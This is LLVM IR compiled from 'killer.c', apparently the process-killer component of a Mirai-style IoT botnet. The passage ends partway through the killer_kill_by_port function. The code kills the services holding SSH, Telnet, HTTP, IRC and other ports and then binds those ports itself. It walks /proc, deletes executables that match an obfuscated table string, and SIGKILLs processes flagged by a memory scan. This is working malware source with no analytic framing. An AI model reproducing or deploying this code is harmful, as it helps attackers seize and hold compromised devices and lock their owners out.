; ModuleID = 'killer.c'
source_filename = "killer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.__dirstream = type opaque
%struct.dirent = type { i64, i64, i16, i8, [256 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }

@killer_realpath_len = dso_local global i32 0, align 4
@killer_pid = dso_local global i32 0, align 4
@killer_realpath = dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killer_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.__dirstream*, align 8
  %18 = alloca %struct.dirent*, align 8
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca [64 x i8], align 16
  %26 = alloca i8*, align 8
  %27 = alloca [4096 x i8], align 16
  %28 = alloca [64 x i8], align 16
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  store i32 400, i32* %1, align 4
  %33 = call i64 @time(i64* null) #6
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %2, align 4
  store i32 0, i32* %4, align 4
  %35 = call i32 @fork() #6
  store i32 %35, i32* @killer_pid, align 4
  %36 = load i32, i32* @killer_pid, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %41, label %38

38:                                               ; preds = %0
  %39 = load i32, i32* @killer_pid, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %38, %0
  br label %369

42:                                               ; preds = %38
  %43 = call i32 @sleep(i32 5)
  %44 = call noalias align 16 i8* @malloc(i64 4096) #6
  store i8* %44, i8** @killer_realpath, align 8
  %45 = load i8*, i8** @killer_realpath, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 0
  store i8 0, i8* %46, align 1
  store i32 0, i32* @killer_realpath_len, align 4
  %47 = call signext i8 @has_exe_access()
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42
  br label %369

50:                                               ; preds = %42
  br label %51

51:                                               ; preds = %50, %366
  call void @table_unlock_val(i8 zeroext 13)
  %52 = call i8* @table_retrieve_val(i32 13, i32* null)
  %53 = call %struct.__dirstream* @opendir(i8* %52)
  store %struct.__dirstream* %53, %struct.__dirstream** %17, align 8
  %54 = icmp eq %struct.__dirstream* %53, null
  br i1 %54, label %55, label %56

55:                                               ; preds = %51
  br label %369

56:                                               ; preds = %51
  call void @table_lock_val(i8 zeroext 13)
  %57 = call zeroext i16 @htons(i16 zeroext -17435) #7
  %58 = call signext i8 @killer_kill_by_port(i16 zeroext %57)
  %59 = icmp ne i8 %58, 0
  br i1 %59, label %60, label %61

60:                                               ; preds = %56
  br label %61

61:                                               ; preds = %60, %56
  %62 = call zeroext i16 @htons(i16 zeroext 1991) #7
  %63 = call signext i8 @killer_kill_by_port(i16 zeroext %62)
  %64 = icmp ne i8 %63, 0
  br i1 %64, label %65, label %66

65:                                               ; preds = %61
  br label %66

66:                                               ; preds = %65, %61
  %67 = call zeroext i16 @htons(i16 zeroext 1338) #7
  %68 = call signext i8 @killer_kill_by_port(i16 zeroext %67)
  %69 = icmp ne i8 %68, 0
  br i1 %69, label %70, label %71

70:                                               ; preds = %66
  br label %71

71:                                               ; preds = %70, %66
  %72 = call zeroext i16 @htons(i16 zeroext 80) #7
  %73 = call signext i8 @killer_kill_by_port(i16 zeroext %72)
  %74 = icmp ne i8 %73, 0
  br i1 %74, label %75, label %76

75:                                               ; preds = %71
  br label %76

76:                                               ; preds = %75, %71
  %77 = call zeroext i16 @htons(i16 zeroext 443) #7
  %78 = call signext i8 @killer_kill_by_port(i16 zeroext %77)
  %79 = icmp ne i8 %78, 0
  br i1 %79, label %80, label %81

80:                                               ; preds = %76
  br label %81

81:                                               ; preds = %80, %76
  %82 = call zeroext i16 @htons(i16 zeroext 4321) #7
  %83 = call signext i8 @killer_kill_by_port(i16 zeroext %82)
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %86

85:                                               ; preds = %81
  br label %86

86:                                               ; preds = %85, %81
  %87 = call zeroext i16 @htons(i16 zeroext 6667) #7
  %88 = call signext i8 @killer_kill_by_port(i16 zeroext %87)
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %91

90:                                               ; preds = %86
  br label %91

91:                                               ; preds = %90, %86
  %92 = call zeroext i16 @htons(i16 zeroext 6697) #7
  %93 = call signext i8 @killer_kill_by_port(i16 zeroext %92)
  %94 = icmp ne i8 %93, 0
  br i1 %94, label %95, label %96

95:                                               ; preds = %91
  br label %96

96:                                               ; preds = %95, %91
  %97 = call zeroext i16 @htons(i16 zeroext 22) #7
  %98 = call signext i8 @killer_kill_by_port(i16 zeroext %97)
  %99 = icmp ne i8 %98, 0
  br i1 %99, label %100, label %101

100:                                              ; preds = %96
  br label %101

101:                                              ; preds = %100, %96
  %102 = call zeroext i16 @htons(i16 zeroext 22) #7
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 1
  store i16 %102, i16* %103, align 2
  %104 = call zeroext i16 @htons(i16 zeroext 23) #7
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = call zeroext i16 @htons(i16 zeroext -12123) #7
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %106, i16* %107, align 2
  %108 = call zeroext i16 @htons(i16 zeroext 80) #7
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %108, i16* %109, align 2
  %110 = call zeroext i16 @htons(i16 zeroext -28321) #7
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i16 %110, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext -12667) #7
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %112, i16* %113, align 2
  %114 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %114, i32* %6, align 4
  %115 = icmp ne i32 %114, -1
  br i1 %115, label %116, label %125

116:                                              ; preds = %101
  %117 = load i32, i32* %6, align 4
  %118 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %119 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  store %struct.sockaddr* %119, %struct.sockaddr** %118, align 8
  %120 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %121 = load %struct.sockaddr*, %struct.sockaddr** %120, align 8
  %122 = call i32 @bind(i32 %117, %struct.sockaddr* %121, i32 16) #6
  %123 = load i32, i32* %6, align 4
  %124 = call i32 @listen(i32 %123, i32 1) #6
  br label %125

125:                                              ; preds = %116, %101
  %126 = call zeroext i16 @htons(i16 zeroext 23) #7
  %127 = call signext i8 @killer_kill_by_port(i16 zeroext %126)
  %128 = sext i8 %127 to i32
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %150, label %130

130:                                              ; preds = %125
  %131 = call zeroext i16 @htons(i16 zeroext -12123) #7
  %132 = call signext i8 @killer_kill_by_port(i16 zeroext %131)
  %133 = sext i8 %132 to i32
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %150, label %135

135:                                              ; preds = %130
  %136 = call zeroext i16 @htons(i16 zeroext 80) #7
  %137 = call signext i8 @killer_kill_by_port(i16 zeroext %136)
  %138 = sext i8 %137 to i32
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %150, label %140

140:                                              ; preds = %135
  %141 = call zeroext i16 @htons(i16 zeroext -12667) #7
  %142 = call signext i8 @killer_kill_by_port(i16 zeroext %141)
  %143 = sext i8 %142 to i32
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %150, label %145

145:                                              ; preds = %140
  %146 = call zeroext i16 @htons(i16 zeroext -28321) #7
  %147 = call signext i8 @killer_kill_by_port(i16 zeroext %146)
  %148 = sext i8 %147 to i32
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %150, label %151

150:                                              ; preds = %145, %140, %135, %130, %125
  br label %151

151:                                              ; preds = %150, %145
  %152 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %152, i32* %8, align 4
  %153 = icmp ne i32 %152, -1
  br i1 %153, label %154, label %163

154:                                              ; preds = %151
  %155 = load i32, i32* %8, align 4
  %156 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %157 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %157, %struct.sockaddr** %156, align 8
  %158 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %159 = load %struct.sockaddr*, %struct.sockaddr** %158, align 8
  %160 = call i32 @bind(i32 %155, %struct.sockaddr* %159, i32 16) #6
  %161 = load i32, i32* %8, align 4
  %162 = call i32 @listen(i32 %161, i32 1) #6
  br label %163

163:                                              ; preds = %154, %151
  %164 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %164, i32* %10, align 4
  %165 = icmp ne i32 %164, -1
  br i1 %165, label %166, label %175

166:                                              ; preds = %163
  %167 = load i32, i32* %10, align 4
  %168 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %169 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %168, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @bind(i32 %167, %struct.sockaddr* %171, i32 16) #6
  %173 = load i32, i32* %10, align 4
  %174 = call i32 @listen(i32 %173, i32 1) #6
  br label %175

175:                                              ; preds = %166, %163
  %176 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %176, i32* %12, align 4
  %177 = icmp ne i32 %176, -1
  br i1 %177, label %178, label %187

178:                                              ; preds = %175
  %179 = load i32, i32* %12, align 4
  %180 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %181 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %181, %struct.sockaddr** %180, align 8
  %182 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %183 = load %struct.sockaddr*, %struct.sockaddr** %182, align 8
  %184 = call i32 @bind(i32 %179, %struct.sockaddr* %183, i32 16) #6
  %185 = load i32, i32* %12, align 4
  %186 = call i32 @listen(i32 %185, i32 1) #6
  br label %187

187:                                              ; preds = %178, %175
  %188 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %188, i32* %14, align 4
  %189 = icmp ne i32 %188, -1
  br i1 %189, label %190, label %199

190:                                              ; preds = %187
  %191 = load i32, i32* %14, align 4
  %192 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %193 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  store %struct.sockaddr* %193, %struct.sockaddr** %192, align 8
  %194 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %195 = load %struct.sockaddr*, %struct.sockaddr** %194, align 8
  %196 = call i32 @bind(i32 %191, %struct.sockaddr* %195, i32 16) #6
  %197 = load i32, i32* %14, align 4
  %198 = call i32 @listen(i32 %197, i32 1) #6
  br label %199

199:                                              ; preds = %190, %187
  %200 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %200, i32* %16, align 4
  %201 = icmp ne i32 %200, -1
  br i1 %201, label %202, label %211

202:                                              ; preds = %199
  %203 = load i32, i32* %16, align 4
  %204 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %205 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  store %struct.sockaddr* %205, %struct.sockaddr** %204, align 8
  %206 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %207 = load %struct.sockaddr*, %struct.sockaddr** %206, align 8
  %208 = call i32 @bind(i32 %203, %struct.sockaddr* %207, i32 16) #6
  %209 = load i32, i32* %16, align 4
  %210 = call i32 @listen(i32 %209, i32 1) #6
  br label %211

211:                                              ; preds = %202, %199
  br label %212

212:                                              ; preds = %362, %344, %260, %230, %211
  %213 = load %struct.__dirstream*, %struct.__dirstream** %17, align 8
  %214 = call %struct.dirent* @readdir(%struct.__dirstream* %213)
  store %struct.dirent* %214, %struct.dirent** %18, align 8
  %215 = icmp ne %struct.dirent* %214, null
  br i1 %215, label %216, label %366

216:                                              ; preds = %212
  %217 = load %struct.dirent*, %struct.dirent** %18, align 8
  %218 = getelementptr inbounds %struct.dirent, %struct.dirent* %217, i32 0, i32 4
  %219 = getelementptr inbounds [256 x i8], [256 x i8]* %218, i64 0, i64 0
  %220 = load i8, i8* %219, align 1
  %221 = sext i8 %220 to i32
  %222 = icmp slt i32 %221, 48
  br i1 %222, label %230, label %223

223:                                              ; preds = %216
  %224 = load %struct.dirent*, %struct.dirent** %18, align 8
  %225 = getelementptr inbounds %struct.dirent, %struct.dirent* %224, i32 0, i32 4
  %226 = getelementptr inbounds [256 x i8], [256 x i8]* %225, i64 0, i64 0
  %227 = load i8, i8* %226, align 1
  %228 = sext i8 %227 to i32
  %229 = icmp sgt i32 %228, 57
  br i1 %229, label %230, label %231

230:                                              ; preds = %223, %216
  br label %212, !llvm.loop !6

231:                                              ; preds = %223
  %232 = getelementptr inbounds [64 x i8], [64 x i8]* %25, i64 0, i64 0
  store i8* %232, i8** %26, align 8
  %233 = getelementptr inbounds [64 x i8], [64 x i8]* %28, i64 0, i64 0
  store i8* %233, i8** %29, align 8
  %234 = load %struct.dirent*, %struct.dirent** %18, align 8
  %235 = getelementptr inbounds %struct.dirent, %struct.dirent* %234, i32 0, i32 4
  %236 = getelementptr inbounds [256 x i8], [256 x i8]* %235, i64 0, i64 0
  %237 = call i32 @atoi(i8* %236) #8
  store i32 %237, i32* %32, align 4
  %238 = load i32, i32* %4, align 4
  %239 = add i32 %238, 1
  store i32 %239, i32* %4, align 4
  %240 = load i32, i32* %32, align 4
  %241 = load i32, i32* %1, align 4
  %242 = icmp sle i32 %240, %241
  br i1 %242, label %243, label %261

243:                                              ; preds = %231
  %244 = call i64 @time(i64* null) #6
  %245 = load i32, i32* %2, align 4
  %246 = sext i32 %245 to i64
  %247 = sub nsw i64 %244, %246
  %248 = icmp sgt i64 %247, 600
  br i1 %248, label %249, label %250

249:                                              ; preds = %243
  store i32 400, i32* %1, align 4
  br label %260

250:                                              ; preds = %243
  %251 = load i32, i32* %32, align 4
  %252 = icmp sgt i32 %251, 400
  br i1 %252, label %253, label %259

253:                                              ; preds = %250
  %254 = load i32, i32* %4, align 4
  %255 = urem i32 %254, 10
  %256 = icmp eq i32 %255, 0
  br i1 %256, label %257, label %259

257:                                              ; preds = %253
  %258 = call i32 @sleep(i32 1)
  br label %259

259:                                              ; preds = %257, %253, %250
  br label %260

260:                                              ; preds = %259, %249
  br label %212, !llvm.loop !6

261:                                              ; preds = %231
  %262 = load i32, i32* %32, align 4
  %263 = load i32, i32* %1, align 4
  %264 = icmp sgt i32 %262, %263
  br i1 %264, label %265, label %267

265:                                              ; preds = %261
  %266 = load i32, i32* %32, align 4
  store i32 %266, i32* %1, align 4
  br label %267

267:                                              ; preds = %265, %261
  %268 = call i64 @time(i64* null) #6
  %269 = trunc i64 %268 to i32
  store i32 %269, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 13)
  call void @table_unlock_val(i8 zeroext 14)
  %270 = load i8*, i8** %26, align 8
  %271 = call i8* @table_retrieve_val(i32 13, i32* null)
  %272 = call i32 @util_strcpy(i8* %270, i8* %271)
  %273 = load i8*, i8** %26, align 8
  %274 = sext i32 %272 to i64
  %275 = getelementptr inbounds i8, i8* %273, i64 %274
  store i8* %275, i8** %26, align 8
  %276 = load i8*, i8** %26, align 8
  %277 = load %struct.dirent*, %struct.dirent** %18, align 8
  %278 = getelementptr inbounds %struct.dirent, %struct.dirent* %277, i32 0, i32 4
  %279 = getelementptr inbounds [256 x i8], [256 x i8]* %278, i64 0, i64 0
  %280 = call i32 @util_strcpy(i8* %276, i8* %279)
  %281 = load i8*, i8** %26, align 8
  %282 = sext i32 %280 to i64
  %283 = getelementptr inbounds i8, i8* %281, i64 %282
  store i8* %283, i8** %26, align 8
  %284 = load i8*, i8** %26, align 8
  %285 = call i8* @table_retrieve_val(i32 14, i32* null)
  %286 = call i32 @util_strcpy(i8* %284, i8* %285)
  %287 = load i8*, i8** %26, align 8
  %288 = sext i32 %286 to i64
  %289 = getelementptr inbounds i8, i8* %287, i64 %288
  store i8* %289, i8** %26, align 8
  %290 = load i8*, i8** %29, align 8
  %291 = call i8* @table_retrieve_val(i32 13, i32* null)
  %292 = call i32 @util_strcpy(i8* %290, i8* %291)
  %293 = load i8*, i8** %29, align 8
  %294 = sext i32 %292 to i64
  %295 = getelementptr inbounds i8, i8* %293, i64 %294
  store i8* %295, i8** %29, align 8
  %296 = load i8*, i8** %29, align 8
  %297 = load %struct.dirent*, %struct.dirent** %18, align 8
  %298 = getelementptr inbounds %struct.dirent, %struct.dirent* %297, i32 0, i32 4
  %299 = getelementptr inbounds [256 x i8], [256 x i8]* %298, i64 0, i64 0
  %300 = call i32 @util_strcpy(i8* %296, i8* %299)
  %301 = load i8*, i8** %29, align 8
  %302 = sext i32 %300 to i64
  %303 = getelementptr inbounds i8, i8* %301, i64 %302
  store i8* %303, i8** %29, align 8
  %304 = load i8*, i8** %29, align 8
  %305 = call i8* @table_retrieve_val(i32 29, i32* null)
  %306 = call i32 @util_strcpy(i8* %304, i8* %305)
  %307 = load i8*, i8** %29, align 8
  %308 = sext i32 %306 to i64
  %309 = getelementptr inbounds i8, i8* %307, i64 %308
  store i8* %309, i8** %29, align 8
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  %310 = getelementptr inbounds [64 x i8], [64 x i8]* %25, i64 0, i64 0
  %311 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 0
  %312 = call i64 @readlink(i8* %310, i8* %311, i64 4095) #6
  %313 = trunc i64 %312 to i32
  store i32 %313, i32* %30, align 4
  %314 = icmp ne i32 %313, -1
  br i1 %314, label %315, label %355

315:                                              ; preds = %267
  %316 = load i32, i32* %30, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 %317
  store i8 0, i8* %318, align 1
  call void @table_unlock_val(i8 zeroext 30)
  %319 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 0
  %320 = load i32, i32* %30, align 4
  %321 = sub nsw i32 %320, 1
  %322 = call i8* @table_retrieve_val(i32 30, i32* null)
  %323 = call i32 @util_stristr(i8* %319, i32 %321, i8* %322)
  %324 = icmp ne i32 %323, -1
  br i1 %324, label %325, label %330

325:                                              ; preds = %315
  %326 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 0
  %327 = call i32 @unlink(i8* %326) #6
  %328 = load i32, i32* %32, align 4
  %329 = call i32 @kill(i32 %328, i32 9) #6
  br label %330

330:                                              ; preds = %325, %315
  call void @table_lock_val(i8 zeroext 30)
  %331 = load i32, i32* %32, align 4
  %332 = call i32 @getpid() #6
  %333 = icmp eq i32 %331, %332
  br i1 %333, label %344, label %334

334:                                              ; preds = %330
  %335 = load i32, i32* %32, align 4
  %336 = call i32 @getppid() #6
  %337 = icmp eq i32 %335, %336
  br i1 %337, label %344, label %338

338:                                              ; preds = %334
  %339 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 0
  %340 = load i8*, i8** @killer_realpath, align 8
  %341 = call signext i8 @util_strcmp(i8* %339, i8* %340)
  %342 = sext i8 %341 to i32
  %343 = icmp ne i32 %342, 0
  br i1 %343, label %344, label %345

344:                                              ; preds = %338, %334, %330
  br label %212, !llvm.loop !6

345:                                              ; preds = %338
  %346 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 0
  %347 = call i32 (i8*, i32, ...) @open(i8* %346, i32 0)
  store i32 %347, i32* %31, align 4
  %348 = icmp eq i32 %347, -1
  br i1 %348, label %349, label %352

349:                                              ; preds = %345
  %350 = load i32, i32* %32, align 4
  %351 = call i32 @kill(i32 %350, i32 9) #6
  br label %352

352:                                              ; preds = %349, %345
  %353 = load i32, i32* %31, align 4
  %354 = call i32 @close(i32 %353)
  br label %355

355:                                              ; preds = %352, %267
  %356 = getelementptr inbounds [64 x i8], [64 x i8]* %25, i64 0, i64 0
  %357 = call signext i8 @memory_scan_match(i8* %356)
  %358 = icmp ne i8 %357, 0
  br i1 %358, label %359, label %362

359:                                              ; preds = %355
  %360 = load i32, i32* %32, align 4
  %361 = call i32 @kill(i32 %360, i32 9) #6
  br label %362

362:                                              ; preds = %359, %355
  %363 = getelementptr inbounds [64 x i8], [64 x i8]* %25, i64 0, i64 0
  call void @util_zero(i8* %363, i32 64)
  %364 = getelementptr inbounds [64 x i8], [64 x i8]* %28, i64 0, i64 0
  call void @util_zero(i8* %364, i32 64)
  %365 = call i32 @sleep(i32 1)
  br label %212, !llvm.loop !6

366:                                              ; preds = %212
  %367 = load %struct.__dirstream*, %struct.__dirstream** %17, align 8
  %368 = call i32 @closedir(%struct.__dirstream* %367)
  br label %51

369:                                              ; preds = %41, %49, %55
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @fork() #1

declare i32 @sleep(i32) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @has_exe_access() #0 {
  %1 = alloca i8, align 1
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i8*, align 8
  %4 = alloca [16 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  store i8* %7, i8** %3, align 8
  call void @table_unlock_val(i8 zeroext 13)
  call void @table_unlock_val(i8 zeroext 14)
  %8 = load i8*, i8** %3, align 8
  %9 = call i8* @table_retrieve_val(i32 13, i32* null)
  %10 = call i32 @util_strcpy(i8* %8, i8* %9)
  %11 = load i8*, i8** %3, align 8
  %12 = sext i32 %10 to i64
  %13 = getelementptr inbounds i8, i8* %11, i64 %12
  store i8* %13, i8** %3, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getpid() #6
  %16 = getelementptr inbounds [16 x i8], [16 x i8]* %4, i64 0, i64 0
  %17 = call i8* @util_itoa(i32 %15, i32 10, i8* %16)
  %18 = call i32 @util_strcpy(i8* %14, i8* %17)
  %19 = load i8*, i8** %3, align 8
  %20 = sext i32 %18 to i64
  %21 = getelementptr inbounds i8, i8* %19, i64 %20
  store i8* %21, i8** %3, align 8
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @table_retrieve_val(i32 14, i32* null)
  %24 = call i32 @util_strcpy(i8* %22, i8* %23)
  %25 = load i8*, i8** %3, align 8
  %26 = sext i32 %24 to i64
  %27 = getelementptr inbounds i8, i8* %25, i64 %26
  store i8* %27, i8** %3, align 8
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %29 = call i32 (i8*, i32, ...) @open(i8* %28, i32 0)
  store i32 %29, i32* %5, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %32

31:                                               ; preds = %0
  store i8 0, i8* %1, align 1
  br label %53

32:                                               ; preds = %0
  %33 = load i32, i32* %5, align 4
  %34 = call i32 @close(i32 %33)
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %36 = load i8*, i8** @killer_realpath, align 8
  %37 = call i64 @readlink(i8* %35, i8* %36, i64 4095) #6
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %6, align 4
  %39 = icmp ne i32 %38, -1
  br i1 %39, label %40, label %45

40:                                               ; preds = %32
  %41 = load i8*, i8** @killer_realpath, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  store i8 0, i8* %44, align 1
  br label %45

45:                                               ; preds = %40, %32
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %47 = load i8*, i8** %3, align 8
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %49 = ptrtoint i8* %47 to i64
  %50 = ptrtoint i8* %48 to i64
  %51 = sub i64 %49, %50
  %52 = trunc i64 %51 to i32
  call void @util_zero(i8* %46, i32 %52)
  store i8 1, i8* %1, align 1
  br label %53

53:                                               ; preds = %45, %31
  %54 = load i8, i8* %1, align 1
  ret i8 %54
}

declare void @table_unlock_val(i8 zeroext) #2

declare %struct.__dirstream* @opendir(i8*) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare void @table_lock_val(i8 zeroext) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local signext i8 @killer_kill_by_port(i16 zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i16, align 2
  %4 = alloca %struct.__dirstream*, align 8
  %5 = alloca %struct.__dirstream*, align 8
  %6 = alloca %struct.dirent*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  %10 = alloca [513 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [16 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca [16 x i8], align 16
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  store i16 %0, i16* %3, align 2
  %24 = bitcast [4096 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %24, i8 0, i64 4096, i1 false)
  %25 = bitcast [4096 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %25, i8 0, i64 4096, i1 false)
  %26 = bitcast [513 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %26, i8 0, i64 513, i1 false)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %27 = bitcast [16 x i8]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %27, i8 0, i64 16, i1 false)
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %28, i8** %14, align 8
  store i32 0, i32* %15, align 4
  %29 = load i16, i16* %3, align 2
  %30 = call zeroext i16 @ntohs(i16 zeroext %29) #7
  %31 = zext i16 %30 to i32
  %32 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %33 = call i8* @util_itoa(i32 %31, i32 16, i8* %32)
  %34 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %35 = call i32 @util_strlen(i8* %34)
  %36 = icmp eq i32 %35, 2
  br i1 %36, label %37, label %47

37:                                               ; preds = %1
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %39 = load i8, i8* %38, align 16
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 2
  store i8 %39, i8* %40, align 2
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 3
  store i8 %42, i8* %43, align 1
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 4
  store i8 0, i8* %44, align 4
  %45 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %45, align 16
